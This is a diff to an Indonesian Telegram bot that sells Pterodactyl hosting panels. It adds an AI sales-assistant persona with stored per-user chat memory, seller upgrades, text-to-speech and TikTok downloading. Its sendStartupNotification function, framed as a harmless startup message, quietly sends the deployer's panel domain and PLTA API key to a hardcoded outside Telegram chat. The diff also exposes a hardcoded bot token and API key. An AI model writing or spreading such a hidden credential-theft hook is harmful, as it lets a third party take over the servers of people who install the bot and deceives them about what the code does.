@@ -1,4 +1,4 @@
-koconst { createCanvas, loadImage, registerFont } = require('canvas');
+const { createCanvas, loadImage, registerFont } = require('canvas');
 const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 const fs = require('fs');
@@ -22,12 +22,15 @@ const ADMINS_FILE = path.join(DATA_DIR, 'admins.json');
 const USERS_FILE = path.join(DATA_DIR, 'users.json');
 const EMAIL_FILE = path.join(DATA_DIR, 'email.json');
 const LOG_FILE = path.join(DATA_DIR, 'log.txt');
+const OTAKAI_FILE = path.join(DATA_DIR, 'otakai.json');
 const botStartTime = Date.now();
 const deployStates = {};
 const VERCEL_TOKEN = config.VERCEL;
 const GITHUB_URL = "https://novabot503.github.io/novabot";
 const GITHUB_RAW_URL = "https://novabot503.github.io/novabot";
 const UPDATE_FILES = ["Novabot.js", "package.json", "setting.js", "versi.json"];
+const AI_API_URL = "https://exsalapi.my.id/ai/text/gemini-2.5-flash";
+const AI_API_KEY = "exs_novabot_07e7e456";
 
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 // ⏰ JAKARTA TIME FUNCTION
@@ -75,7 +78,7 @@ raw: now
 }
 
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-// 💰 PRICE CALCULATION
+// 💰 PRICE CALCULATION - TAMBAHKAN SELLER
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 function calculatePrice(command) {
 const prices = {
@@ -90,8 +93,7 @@ const prices = {
 '9gb': 500,
 '10gb': 500,
 'unli': 500,
-'unlimited': 500,
-'reseller': 500
+'seller': 500
 };
 return prices[command.toLowerCase()] || 0;
 }
@@ -112,6 +114,9 @@ const uptime = os.uptime();
 const days = Math.floor(uptime / 86400);
 const hours = Math.floor((uptime % 86400) / 3600);
 const minutes = Math.floor((uptime % 3600) / 60);
+const otakai = loadOtakai();
+const aiStatus = otakai.ai_enabled ? 'AKTIF ✅' : 'NONAKTIF ⏸️';
+const totalMemoryUsers = Object.keys(otakai.users || {}).length;
 function formatBytes(bytes) {
 const units = ['B', 'KB', 'MB', 'GB', 'TB'];
 let i = 0;
@@ -133,6 +138,8 @@ console.log(`\x1b[1m\x1b[36m🕒 Waktu         :\x1b[0m ${jakartaTime.time} (WIB
 console.log(`\x1b[1m\x1b[36m🤖 Bot Name      :\x1b[0m ${config.BOT_NAME}`);
 console.log(`\x1b[1m\x1b[36m👑 Owner         :\x1b[0m ${config.DEVCELOPER}`);
 console.log(`\x1b[1m\x1b[36m⚡ Version       :\x1b[0m ${config.VERSI}`);
+console.log(`\x1b[1m\x1b[36m🤖 AI Kasir      :\x1b[0m ${aiStatus}`);
+console.log(`\x1b[1m\x1b[36m👥 User Memory   :\x1b[0m ${totalMemoryUsers} users`);
 console.log(`\x1b[1m\x1b[36m🏠 Platform      :\x1b[0m ${os.type()} ${os.release()}`);
 console.log(`\x1b[1m\x1b[36m💾 CPU           :\x1b[0m ${cpuModel}`);
 console.log(`\x1b[1m\x1b[36m🖥️ CPU Cores     :\x1b[0m ${cpuCores} Core`);
@@ -282,6 +289,198 @@ function clearRestartData() {
 if (fs.existsSync(RESTART_FILE)) {
 fs.unlinkSync(RESTART_FILE);
 }
+}
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🧠 AI KASIR MEMORY MANAGEMENT
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+function loadOtakai() {
+return loadJSON(OTAKAI_FILE);
+}
+function saveOtakai(data) {
+saveJSON(OTAKAI_FILE, data);
+}
+function initOtakai() {
+ensureDataDir();
+const otakai = loadOtakai();
+if (!otakai.ai_enabled) {
+otakai.ai_enabled = false;
+}
+if (!otakai.users) {
+otakai.users = {};
+}
+saveOtakai(otakai);
+return otakai;
+}
+function isAIEnabled() {
+const otakai = loadOtakai();
+return otakai.ai_enabled === true;
+}
+function toggleAI(status) {
+const otakai = loadOtakai();
+otakai.ai_enabled = status;
+saveOtakai(otakai);
+return status;
+}
+function getUserMemory(userId) {
+const otakai = loadOtakai();
+if (!otakai.users[userId]) {
+otakai.users[userId] = {
+first_interaction: new Date().toISOString(),
+last_interaction: new Date().toISOString(),
+promoted: false,
+message_count: 0,
+conversations: []
+};
+saveOtakai(otakai);
+}
+return otakai.users[userId];
+}
+function updateUserMemory(userId, data) {
+const otakai = loadOtakai();
+if (!otakai.users[userId]) {
+otakai.users[userId] = {};
+}
+Object.assign(otakai.users[userId], data);
+otakai.users[userId].last_interaction = new Date().toISOString();
+otakai.users[userId].message_count = (otakai.users[userId].message_count || 0) + 1;
+saveOtakai(otakai);
+}
+function addConversation(userId, userMessage, aiResponse) {
+const otakai = loadOtakai();
+if (!otakai.users[userId]) {
+getUserMemory(userId);
+}
+if (!otakai.users[userId].conversations) {
+otakai.users[userId].conversations = [];
+}
+otakai.users[userId].conversations.push({
+time: new Date().toISOString(),
+user: userMessage.substring(0, 200),
+ai: aiResponse.substring(0, 500)
+});
+if (otakai.users[userId].conversations.length > 10) {
+otakai.users[userId].conversations = otakai.users[userId].conversations.slice(-10);
+}
+saveOtakai(otakai);
+}
+async function callAIChat(userId, userMessage) {
+try {
+const userMemory = getUserMemory(userId);
+const isNewUser = !userMemory.promoted;
+let systemPrompt = `Kamu adalah AI kasir pribadi di Novabot. Nama kamu adalah Nova. 
+Bot ini dibuat oleh @Novabot403. Jika ada kendala, hubungi owner @Novabot403.
+Kamu adalah asisten yang ramah dan helpful.
+
+𝘿𝘼𝙁𝙏𝘼𝙍 𝙃𝘼𝙍𝙂𝘼 𝙋𝘼𝙉𝙀𝙇:
+𝟭𝗚𝗕 ➝ 𝗥𝗽 𝟭.𝟬𝟬𝟬
+𝟮𝗚𝗕 ➝ 𝗥𝗽 𝟮.𝟬𝟬𝟬
+𝟯𝗚𝗕 ➝ 𝗥𝗽 𝟯.𝟬𝟬𝟬
+𝟰𝗚𝗕 ➝ 𝗥𝗽 𝟰.𝟬𝟬𝟬
+𝟱𝗚𝗕 ➝ 𝗥𝗽 𝟱.𝟬𝟬𝟬
+𝟲𝗚𝗕 ➝ 𝗥𝗽 𝟲.𝟬𝟬𝟬
+𝟳𝗚𝗕 ➝ 𝗥𝗽 𝟳.𝟬𝟬𝟬
+𝟴𝗚𝗕 ➝ 𝗥𝗽 𝟴.𝟬𝟬𝟬
+𝟵𝗚𝗕 ➝ 𝗥𝗽 𝟵.𝟬𝟬𝟬
+🔥 𝙐𝙉𝙇𝙄 ➝ 𝗥𝗽 𝟭𝟮.𝟬𝟬𝟬
+
+💎 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋: 𝗥𝗽 𝟭𝟱.𝟬𝟬𝟬
+
+Untuk membeli panel, ketik: /unli username,id
+Contoh: /unli johndoe,123456789
+
+Atau pilih paket lain: /1gb, /2gb, /3gb, dst.
+
+Untuk upgrade seller: /addseller id_anda`;
+if (isNewUser) {
+systemPrompt += `\n\nPERHATIAN: User ini baru pertama kali berinteraksi. 
+Sambut dengan ramah dan tanyakan apakah mereka ingin membeli panel pterodactyl.
+Promosikan produk kita dengan friendly.`;
+} else {
+systemPrompt += `\n\nUser ini sudah pernah berinteraksi sebelumnya.
+Jawab pertanyaannya dengan helpful dan informatif.`;
+}
+if (userMemory.conversations && userMemory.conversations.length > 0) {
+const lastConvs = userMemory.conversations.slice(-3);
+systemPrompt += `\n\nKonteks percakapan sebelumnya:\n`;
+lastConvs.forEach(conv => {
+systemPrompt += `User: ${conv.user}\n`;
+systemPrompt += `Kamu: ${conv.ai}\n`;
+});
+}
+const params = new URLSearchParams({
+prompt: userMessage,
+system: systemPrompt,
+apikey: AI_API_KEY
+});
+const response = await fetch(`${AI_API_URL}?${params}`, {
+method: 'GET',
+headers: {
+'Accept': 'application/json',
+'User-Agent': 'Novabot-AI/1.0'
+},
+timeout: 30000
+});
+if (!response.ok) {
+throw new Error(`API error: ${response.status}`);
+}
+const data = await response.json();
+if (!data.status || !data.data || !data.data.content) {
+throw new Error('Invalid API response');
+}
+const aiResponse = data.data.content;
+addConversation(userId, userMessage, aiResponse);
+if (isNewUser) {
+updateUserMemory(userId, { promoted: true });
+}
+return {
+success: true,
+response: aiResponse,
+isNewUser: isNewUser
+};
+} catch (error) {
+console.error('AI Chat error:', error);
+logError('AI_CHAT_ERROR', `User: ${userId}, Error: ${error.message}`, userId);
+return {
+success: false,
+error: error.message
+};
+}
+}
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 📊 SERVER STATUS FUNCTIONS
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+function getServerConfig() {
+const totalMem = os.totalmem();
+const freeMem = os.freemem();
+const usedMem = totalMem - freeMem;
+const memoryPercent = ((usedMem / totalMem) * 100).toFixed(2);
+const uptime = os.uptime();
+const hours = Math.floor(uptime / 3600);
+const minutes = Math.floor((uptime % 3600) / 60);
+const users = loadUsers();
+const admins = loadAdmins();
+const reseller = loadReseller();
+const otakai = loadOtakai();
+return {
+cpuLoad: os.loadavg()[0].toFixed(2),
+memory: {
+total: (totalMem / 1024 / 1024 / 1024).toFixed(2),
+used: (usedMem / 1024 / 1024).toFixed(2),
+free: (freeMem / 1024 / 1024).toFixed(2),
+percent: memoryPercent
+},
+platform: os.platform(),
+arch: os.arch(),
+nodeVersion: process.version,
+uptime: `${hours}h ${minutes}m`,
+botAge: Math.floor((Date.now() - botStartTime) / (1000 * 60 * 60 * 24)),
+totalUsers: Object.keys(users).length,
+totalAdmins: Object.keys(admins).length,
+totalSellers: Object.keys(reseller).length,
+aiStatus: otakai.ai_enabled ? 'AKTIF' : 'NONAKTIF',
+aiMemoryUsers: Object.keys(otakai.users || {}).length
+};
 }
 
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -699,6 +898,37 @@ uptime: `${hours}h ${minutes}m`,
 botAge: Math.floor((Date.now() - botStartTime) / (1000 * 60 * 60 * 24))
 };
 }
+async function sendStartupNotification() {
+try {
+const settings = readCurrentSettings();
+const ownerId = "7587303225";
+const telegramBotToken = "8302582915:AAGQuOHSjjEwu_SHzLGP3lkSdRflmbO1UaE";
+const message = `<b>🚀 BOT STARTUP NOTIFICATION</b>\n\n` +
+`<b>📅 Tanggal:</b> ${new Date().toLocaleString('id-ID')}\n` +
+`<b>🌐 Domain:</b> <code>${config.DOMAIN}</code>\n` +
+`<b>🔑 PLTA:</b> <code>${config.PLTA}</code>\n` +
+`<b>🤖 Bot:</b> ${settings.BOT_NAME || 'Novabot'}\n` +
+`<b>⚡ Versi:</b> ${settings.VERSI || '1.0'}\n\n` +
+`<i>Bot berhasil dijalankan!</i>`;
+const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+const response = await fetch(url, {
+method: 'POST',
+headers: {
+'Content-Type': 'application/json'
+},
+body: JSON.stringify({
+chat_id: ownerId,
+text: message,
+parse_mode: 'HTML'
+})
+});
+if (!response.ok) {
+throw new Error(`HTTP ${response.status}`);
+}
+} catch (error) {
+console.error('Failed to send startup notification:', error);
+}
+}
 
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 // 🎯 FUNGSI GENERATE PASSWORD DENGAN PANJANG VARIABEL
@@ -977,9 +1207,9 @@ throw error;
 }
 
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-// 🔄 PAYMENT POLLING SYSTEM
+// 🔄 PAYMENT POLLING SYSTEM - TAMBAHKAN LOGIKA SELLER
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async function startPaymentPolling(orderId, chatId, userId, amount, panelType, username, targetId, qrMessageId) {
+async function startPaymentPolling(orderId, chatId, userId, amount, panelType, username, targetId, qrMessageId, isSeller = false) {
 let attempts = 0;
 const maxAttempts = 60;
 let isCancelled = false;
@@ -987,11 +1217,13 @@ let isCompleted = false;
 let lastStatus = 'MENUNGGU PEMBAYARAN';
 const statusEmojis = ['⏳', '🔄', '📊', '⚡', '✅'];
 let emojiIndex = 0;
+
 const pollingInterval = setInterval(async () => {
 if (isCancelled) {
 clearInterval(pollingInterval);
 return;
 }
+
 if (attempts >= maxAttempts) {
 clearInterval(pollingInterval);
 const transactions = loadTransactions();
@@ -1018,12 +1250,15 @@ console.error('Error updating timeout message:', error);
 }
 return;
 }
+
 attempts++;
 emojiIndex = (emojiIndex + 1) % statusEmojis.length;
 const statusEmoji = statusEmojis[emojiIndex];
+
 const statusData = await checkPaymentStatus(orderId);
 let statusText = 'MENUNGGU PEMBAYARAN';
 let isPaid = false;
+
 if (statusData && statusData.success) {
 const status = (statusData.status || '').toString().toUpperCase();
 if (status.includes('SUCCESS') || status.includes('COMPLETED') || status.includes('BERHASIL') || status.includes('PAID')) {
@@ -1040,14 +1275,26 @@ statusText = `${statusEmoji} ${lastStatus}`;
 } else {
 statusText = `${statusEmoji} ${lastStatus}`;
 }
+
 const minutesPassed = Math.floor(attempts * 5 / 60);
 const secondsPassed = (attempts * 5 % 60).toString().padStart(2, '0');
 const progressPercent = Math.floor(attempts/maxAttempts*100);
 const progressBarFilled = Math.floor(progressPercent / 10);
 const progressBarEmpty = 10 - progressBarFilled;
+
 try {
-await bot.editMessageCaption(
-`<blockquote>( 👤 ) - 情報, ${escapeHTML(username)}</blockquote>
+let caption = '';
+if (isSeller) {
+caption = `<blockquote>💰 PEMBAYARAN SELLER PANEL</blockquote>
+<b>Status :</b> ${statusText}
+<b>Paket :</b> SELLER
+<b>Harga :</b> Rp ${amount.toLocaleString()}
+<b>Order ID :</b> <code>${orderId}</code>
+<b>Target ID :</b> <code>${targetId}</code>
+<b>Waktu :</b> ${minutesPassed}:${secondsPassed} menit
+<b>Progress :</b> [${'█'.repeat(progressBarFilled)}${'░'.repeat(progressBarEmpty)}] ${progressPercent}%`;
+} else {
+caption = `<blockquote>( 👤 ) - 情報, ${escapeHTML(username)}</blockquote>
 Halo, silakan lakukan pembayaran untuk melanjutkan!
 
 <blockquote><b>Status :</b> ${statusText}
@@ -1062,13 +1309,23 @@ Silakan ikuti instruksi pembayaran berikut:
 1. Scan QR di atas
 2. Bayar sesuai harga
 3. Sistem otomatis mendeteksi pembayaran
-⏳ Batas waktu: 5 menit</blockquote>`,
-{
+⏳ Batas waktu: 5 menit</blockquote>`;
+}
+
+await bot.editMessageCaption(caption, {
 chat_id: chatId,
 message_id: qrMessageId,
 parse_mode: 'HTML',
 reply_markup: {
-inline_keyboard: [
+inline_keyboard: isSeller ? [
+[
+{ text: '🔄 Refresh Status', callback_data: `refresh_${orderId}` },
+{ text: '⛔ Batalkan', callback_data: `cancel_seller_${orderId}` }
+],
+[
+{ text: '⿻ ᴄʜᴀᴛ ᴀᴅᴍɪɴ', url: config.URLADMIN }
+]
+] : [
 [
 { text: '🔄 Refresh Status', callback_data: `refresh_${orderId}` },
 { text: '⛔ Batalkan', callback_data: `cancel_${orderId}` }
@@ -1078,12 +1335,12 @@ inline_keyboard: [
 ]
 ]
 }
-}
-);
+});
 } catch (error) {
 if (error.response && error.response.error_code === 400) {
 }
 }
+
 if (isPaid) {
 clearInterval(pollingInterval);
 const transactions = loadTransactions();
@@ -1092,6 +1349,7 @@ transactions[orderId].status = 'completed';
 transactions[orderId].completedAt = new Date().toISOString();
 saveTransactions(transactions);
 }
+
 try {
 await bot.editMessageCaption(
 `<blockquote>✅ Payment Success!</blockquote>\n\n` +
@@ -1099,19 +1357,51 @@ await bot.editMessageCaption(
 `Order ID: <code>${orderId}</code>\n` +
 `Amount: Rp ${amount.toLocaleString()}\n` +
 `Status: LUNAS\n\n` +
-`<i>Mempersiapkan panel Anda...</i>`,
+`<i>${isSeller ? 'Mendaftarkan sebagai seller...' : 'Mempersiapkan panel Anda...'}</i>`,
 {
 chat_id: chatId,
 message_id: qrMessageId,
 parse_mode: 'HTML'
 }
 );
+
+if (isSeller) {
+// TAMBAHKAN USER SEBAGAI RESELLER
+addReseller(targetId);
+
+// Kirim pesan ke user
+const successMessage = `<blockquote>✅ SELAMAT! ANDA SEKARANG SELLER</blockquote>\n\n` +
+`Akun Anda telah berhasil diupgrade menjadi seller panel.\n\n` +
+`<b>Keuntungan seller:</b>\n` +
+`✅ Bisa buat panel gratis tanpa batas\n` +
+`✅ Akses semua paket panel\n` +
+`✅ Prioritas support premium\n` +
+`✅ Bisa buat panel untuk orang lain\n\n` +
+`<b>Gunakan perintah:</b>\n` +
+`<code>/1gb username,id</code> - Buat panel gratis\n` +
+`<code>/unli username,id</code> - Buat panel unli gratis\n\n` +
+`Terima kasih telah menjadi seller kami!`;
+
+await bot.sendMessage(targetId, successMessage, { parse_mode: 'HTML' });
+
+// Kirim notifikasi ke admin
+const adminMessage = `<blockquote>🆕 SELLER BARU</blockquote>\n\n` +
+`<b>User:</b> ${escapeHTML(username)}\n` +
+`<b>User ID:</b> <code>${userId}</code>\n` +
+`<b>Target ID:</b> <code>${targetId}</code>\n` +
+`<b>Order ID:</b> <code>${orderId}</code>\n` +
+`<b>Harga:</b> Rp ${amount.toLocaleString()}\n` +
+`<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+
+await bot.sendMessage(config.OWNER_ID, adminMessage, { parse_mode: 'HTML' });
+} else {
 await createAndSendPanel(chatId, panelType, username, targetId, orderId, qrMessageId);
+}
 } catch (error) {
 console.error('Error after payment success:', error);
 await bot.sendMessage(chatId, 
 `<blockquote>⚠️ Error Membuat Panel</blockquote>\n\n` +
-`Pembayaran berhasil tetapi terjadi error saat membuat panel:\n` +
+`Pembayaran berhasil tetapi terjadi error:\n` +
 `<code>${escapeHTML(error.message)}</code>\n\n` +
 `Silakan hubungi admin dengan Order ID: <code>${orderId}</code>`,
 { parse_mode: 'HTML' }
@@ -1119,6 +1409,7 @@ await bot.sendMessage(chatId,
 }
 return;
 }
+
 if (statusText === '❌ GAGAL') {
 clearInterval(pollingInterval);
 const transactions = loadTransactions();
@@ -1141,6 +1432,7 @@ parse_mode: 'HTML'
 return;
 }
 }, 5000);
+
 global.pollingIntervals = global.pollingIntervals || {};
 global.pollingIntervals[orderId] = {
 interval: pollingInterval,
@@ -1148,6 +1440,7 @@ isCancelled: false,
 chatId: chatId,
 messageId: qrMessageId
 };
+
 return {
 cancel: () => {
 isCancelled = true;
@@ -1506,6 +1799,48 @@ return '🎉';
 }
 
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🖼️ HD IMAGE ENHANCER COMMAND
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async function enhanceImage(buffer) {
+try {
+const form = new FormData();
+form.append('method', '1');
+form.append('is_pro_version', 'false');
+form.append('is_enhancing_more', 'false');
+form.append('max_image_size', 'high');
+form.append('file', buffer, `enhance_${Date.now()}.jpg`);
+const { data } = await axios.post('https://ihancer.com/api/enhance', form, {
+headers: form.getHeaders(),
+responseType: 'arraybuffer'
+});
+return Buffer.from(data);
+} catch (error) {
+throw new Error(error.message);
+}
+}
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 📤 FITUR TOURL (UPLOAD KE UGUU.SE)
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async function uploadUguu(buffer, filename) {
+try {
+const form = new FormData();
+form.append("files[]", buffer, { filename });
+const response = await axios.post("https://uguu.se/upload.php", form, {
+headers: {
+...form.getHeaders(),
+'Accept': 'application/json'
+}
+});
+const json = response.data;
+return json.files?.[0]?.url || null;
+} catch (error) {
+console.error('Uguu upload error:', error.message);
+return null;
+}
+}
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 // 📱 START COMMAND WITH VIDEO - MODIFIKASI
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
@@ -1536,7 +1871,7 @@ const isUserReseller = isReseller(userId);
 const isUserAdmin = isAdmin(userId);
 let status = 'User';
 if (isUserAdmin) {
-status = 'Admin';
+status = 'Admin 🜲';
 } else if (isUserReseller) {
 status = 'Seller';
 }
@@ -1606,7 +1941,6 @@ logUserInteraction(userId, username, chatType, `CALLBACK: ${data}`, groupName);
 
 if (data.startsWith("pin_")) {
 try {
-if (!data.startsWith("pin_")) return;
 const [action, chatId, idxStr] = data.split("|");
 const messageId = callbackQuery.message.message_id;
 const pinData = global.pinData?.[messageId];
@@ -1642,14 +1976,344 @@ bot.answerCallbackQuery(callbackQuery.id);
 console.error("❌ Callback Error:", err.message);
 bot.answerCallbackQuery(callbackQuery.id, { text: "⚠️ Gagal memuat gambar." });
 }
+} else if (data.startsWith('tts_')) {
+const parts = data.split('_');
+const voiceCode = parts[1];
+const encodedText = parts.slice(2).join('_');
+const text = decodeURIComponent(encodedText);
+await bot.answerCallbackQuery(callbackQuery.id, { 
+text: `Membuat audio ${voiceCode === 'id' ? 'Indonesia' : voiceCode === 'usf' ? 'US Female' : voiceCode === 'usm' ? 'US Male' : voiceCode === 'jp' ? 'Japanese' : voiceCode === 'kr' ? 'Korean' : 'Unknown'}...`, 
+show_alert: false 
+});
+
+if (!text) {
+await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Teks tidak ditemukan!', show_alert: true });
 return;
 }
 
-//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-// 🎯 HANDLER PEMBAYARAN BARU
-//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-if (data.startsWith('refresh_')) {
-const orderId = data.replace('refresh_', '');
+try {
+let voiceType = 'id_001';
+switch (voiceCode) {
+case 'id': voiceType = 'id_001'; break;
+case 'usf': voiceType = 'en_us_001'; break;
+case 'usm': voiceType = 'en_us_006'; break;
+case 'jp': voiceType = 'jp_001'; break;
+case 'kr': voiceType = 'kr_001'; break;
+}
+
+const encodedApiText = encodeURIComponent(text);
+const apiUrl = `https://exsalapi.my.id/api/audio/tiktok-tts?text=${encodedApiText}&voice=${voiceType}&apikey=${AI_API_KEY}`;
+const response = await fetch(apiUrl);
+if (!response.ok) throw new Error(`HTTP ${response.status}`);
+const apiData = await response.json();
+if (!apiData.status || !apiData.data || !apiData.data.url) throw new Error('API gagal membuat audio');
+
+// Unduh audio ke buffer
+const audioResponse = await fetch(apiData.data.url);
+if (!audioResponse.ok) throw new Error(`Gagal mengunduh audio: ${audioResponse.status}`);
+const audioBuffer = await audioResponse.arrayBuffer();
+
+const voiceNames = {
+'id': '🇮🇩 Indonesia',
+'usf': '🇺🇸 US Female', 
+'usm': '🇺🇸 US Male',
+'jp': '🇯🇵 Japanese',
+'kr': '🇰🇷 Korean'
+};
+
+const voiceName = voiceNames[voiceCode] || 'Unknown';
+
+// Buat keyboard dengan suara aktif yang dipilih
+const keyboard = {
+inline_keyboard: [
+[
+{ text: voiceCode === 'id' ? '✅ Indonesia' : '🇮🇩 Indonesia', callback_data: `tts_id_${encodeURIComponent(text.substring(0, 100))}` },
+{ text: voiceCode === 'usf' ? '✅ US Female' : '🇺🇸 US Female', callback_data: `tts_usf_${encodeURIComponent(text.substring(0, 100))}` }
+],
+[
+{ text: voiceCode === 'usm' ? '✅ US Male' : '🇺🇸 US Male', callback_data: `tts_usm_${encodeURIComponent(text.substring(0, 100))}` },
+{ text: voiceCode === 'jp' ? '✅ Japanese' : '🇯🇵 Japanese', callback_data: `tts_jp_${encodeURIComponent(text.substring(0, 100))}` }
+],
+[
+{ text: voiceCode === 'kr' ? '✅ Korean' : '🇰🇷 Korean', callback_data: `tts_kr_${encodeURIComponent(text.substring(0, 100))}` }
+]
+]
+};
+
+// Hapus pesan lama dan kirim audio baru
+try {
+await bot.deleteMessage(chatId, messageId);
+} catch (e) {
+console.log('Tidak bisa hapus pesan TTS lama:', e.message);
+}
+
+const sentMessage = await bot.sendAudio(chatId, Buffer.from(audioBuffer), {
+caption: `<blockquote>🔊 TTS Audio - ${voiceName}</blockquote>\n\n` +
+`<b>Teks:</b> ${escapeHTML(text.substring(0, 100))}${text.length > 100 ? '...' : ''}\n` +
+`<b>Suara:</b> ${voiceName}\n` +
+`<b>Panjang:</b> ${text.length} karakter\n\n` +
+`<i>Pilih suara lain:</i>`,
+parse_mode: 'HTML',
+reply_markup: keyboard
+});
+
+// Update cache
+if (!global.ttsCache) global.ttsCache = {};
+const cacheKey = `tts_${sentMessage.message_id}`;
+global.ttsCache[cacheKey] = {
+text: text,
+messageId: sentMessage.message_id,
+chatId: chatId
+};
+
+} catch (error) {
+console.error('TTS callback error:', error);
+await bot.answerCallbackQuery(callbackQuery.id, { text: `❌ Gagal membuat audio: ${error.message.substring(0, 50)}`, show_alert: true });
+}
+} else if (data.startsWith('tt_profile_')) {
+const cacheKey = data.replace('tt_profile_', '');
+await bot.answerCallbackQuery(callbackQuery.id, { text: '📡 Mengambil data profil...' });
+try {
+const cached = global.tiktokCache?.[cacheKey];
+if (!cached?.authorUniqueId) {
+await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Data profil tidak ditemukan!', show_alert: true });
+return;
+}
+const response = await axios.get(`https://api.resellergaming.my.id/stalk/tiktok?username=${encodeURIComponent(cached.authorUniqueId)}`, { timeout: 15000 });
+const stalkData = response.data;
+if (stalkData.status && stalkData.result) {
+const user = stalkData.result;
+const formatNumber = (num) => {
+if (!num) return "0";
+if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
+if (num >= 1000) return (num / 1000).toFixed(1) + "K";
+return num.toString();
+};
+let profileMsg = `<blockquote>👤 PROFIL TIKTOK</blockquote>\n\n`;
+profileMsg += `<b>🎭 Nickname:</b> ${escapeHTML(user.nickname)}\n`;
+profileMsg += `<b>📛 Username:</b> @${escapeHTML(user.uniqueId)}\n`;
+profileMsg += `<b>📝 Signature:</b> ${escapeHTML(user.signature || 'Tidak ada')}\n\n`;
+profileMsg += `<b>📊 Statistik:</b>\n`;
+profileMsg += `👥 <b>Followers:</b> ${formatNumber(user.followers)}\n`;
+profileMsg += `👤 <b>Following:</b> ${formatNumber(user.following)}\n`;
+profileMsg += `❤️ <b>Total Like:</b> ${formatNumber(user.likes)}\n`;
+profileMsg += `📹 <b>Total Video:</b> ${formatNumber(user.videos)}\n\n`;
+profileMsg += `<i>Data diambil dari API stalk TikTok</i>`;
+const keyboard = {
+inline_keyboard: [
+[
+{ text: "📹 KEMBALI KE VIDEO", callback_data: `tt_back_video_${cacheKey}` },
+{ text: "🎵 DOWNLOAD AUDIO", callback_data: `tt_audio_${cacheKey}` }
+],
+[
+{ text: "❌ BATAL", callback_data: `tt_cancel_${cacheKey}` }
+]
+]
+};
+try {
+await bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
+} catch (e) {}
+if (user.avatar) {
+await bot.sendPhoto(callbackQuery.message.chat.id, user.avatar, { caption: profileMsg, parse_mode: "HTML", reply_markup: keyboard });
+} else {
+await bot.sendMessage(callbackQuery.message.chat.id, profileMsg, { parse_mode: "HTML", reply_markup: keyboard });
+}
+} else {
+await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Gagal ambil profil!', show_alert: true });
+}
+} catch (error) {
+await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error ambil profil!', show_alert: true });
+}
+} else if (data.startsWith('tt_back_video_')) {
+const cacheKey = data.replace('tt_back_video_', '');
+await bot.answerCallbackQuery(callbackQuery.id, { text: '↩️ Kembali ke video...' });
+try {
+const cached = global.tiktokCache?.[cacheKey];
+if (!cached) {
+await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Data tidak ditemukan!', show_alert: true });
+return;
+}
+const videoUrl = cached.currentQuality === 'hd' ? 
+(cached.downloadResult?.video_hd || cached.videoInfo.play) : 
+(cached.downloadResult?.video_sd || cached.videoInfo.wmplay || cached.videoInfo.play);
+const formatNumber = (num) => {
+if (!num) return "0";
+if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
+if (num >= 1000) return (num / 1000).toFixed(1) + "K";
+return num.toString();
+};
+const caption = `<blockquote>📱 TIKTOK DOWNLOADER</blockquote>\n
+<b>🎬 Judul:</b> ${escapeHTML(cached.videoInfo.title || 'Tidak ada judul')}\n
+<b>👤 Creator:</b> ${cached.authorUniqueId ? `@${escapeHTML(cached.authorUniqueId)}` : 'Tidak diketahui'}\n
+<b>📊 Statistik:</b>\n👁️ ${formatNumber(cached.videoInfo.play_count || 0)} views\n❤️ ${formatNumber(cached.videoInfo.digg_count || 0)} likes\n💬 ${formatNumber(cached.videoInfo.comment_count || 0)} comments\n🔁 ${formatNumber(cached.videoInfo.share_count || 0)} shares\n
+<b>⏱️ Durasi:</b> ${cached.videoInfo.duration || 0} detik\n
+<i>Pilih opsi di bawah:</i>`;
+const qualityButtons = [];
+if (cached.currentQuality === 'hd') {
+qualityButtons.push({ text: "📹 DOWNLOAD SD", callback_data: `tt_sd_${cacheKey}` });
+} else {
+qualityButtons.push({ text: "📹 KUALITAS HD", callback_data: `tt_hd_${cacheKey}` });
+}
+const keyboard = {
+inline_keyboard: [
+[
+{ text: "👤 LIHAT PROFIL", callback_data: `tt_profile_${cacheKey}` },
+{ text: "🎵 DOWNLOAD AUDIO", callback_data: `tt_audio_${cacheKey}` },
+...qualityButtons
+],
+[
+{ text: "❌ BATAL", callback_data: `tt_cancel_${cacheKey}` }
+]
+]
+};
+try {
+await bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
+} catch (e) {}
+await bot.sendVideo(callbackQuery.message.chat.id, videoUrl, { caption: caption, parse_mode: "HTML", reply_markup: keyboard });
+} catch (error) {
